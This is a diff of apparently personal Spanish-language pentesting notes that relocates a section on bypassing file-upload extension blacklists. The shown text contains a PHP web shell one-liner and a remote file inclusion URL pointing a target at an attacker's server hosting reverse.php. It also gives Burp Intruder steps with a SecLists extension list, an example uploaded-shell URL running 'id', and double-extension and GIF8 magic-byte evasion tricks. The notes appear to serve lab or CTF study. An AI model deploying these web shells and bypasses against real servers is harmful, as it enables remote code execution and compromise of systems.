@@ -356,21 +356,7 @@ EXPLOTACION
                   6 - Ponemos la direccion de mi servidor KALI en la url 
                            http://10.10.231.229/vulnerabilities/fi/?page=http//IPKALI:8080/reverse.php
 
-                  BLACKLIST FILTER
-                  ................
-
-                        Puede ser que haya extensiones en blacklist, para probar que extensiones son validas:
-                           1 - Creo shell.jpg (formato que admita el campo) shell => <?php system($_REQUEST['cmd']); ?>
-                           2 - Intercepto con Burp
-                           3 - Envio intruder y selecciono la extension
-                           4 - Añado una lista de seclist => /SecLists/Discovery/Web-Content/web-extensions.txt
-                           5 - Me dirijo al lugar de subida del archivo => Ej: http://83.136.249.46:40526/profile_images/shell2.phar?cmd=id
-                           6 - Pruebo extensiones validas que ejecuten el comando
-
-                        A veces se necesita algo mas para evadir los filtros hay que poner dos extensiones: shell.php.jpg / shell.jpg.php / shell.jpg.phar / shell.jpg.phtml
-                        Tambien Escribir GIF8 delante del codigo shell. 
-                        
-
+                              
             FILE UPLOAD
             ...........
 
@@ -427,6 +413,20 @@ EXPLOTACION
                            <?php echo system($_GET["cmd"]);?
 
                         Para meter comandos si necesitamos poner espacio en url %20 => Espacio
+
+                  BLACKLIST FILTER
+                  ................
+
+                        Puede ser que haya extensiones en blacklist, para probar que extensiones son validas:
+                           1 - Creo shell.jpg (formato que admita el campo) shell => <?php system($_REQUEST['cmd']); ?>
+                           2 - Intercepto con Burp
+                           3 - Envio intruder y selecciono la extension
+                           4 - Añado una lista de seclist => /SecLists/Discovery/Web-Content/web-extensions.txt
+                           5 - Me dirijo al lugar de subida del archivo => Ej: http://83.136.249.46:40526/profile_images/shell2.phar?cmd=id
+                           6 - Pruebo extensiones validas que ejecuten el comando
+
+                        A veces se necesita algo mas para evadir los filtros hay que poner dos extensiones: shell.php.jpg / shell.jpg.php / shell.jpg.phar / shell.jpg.phtml
+                        Tambien Escribir GIF8 delante del codigo shell. 
                       
                              
             SQL INJENCTION
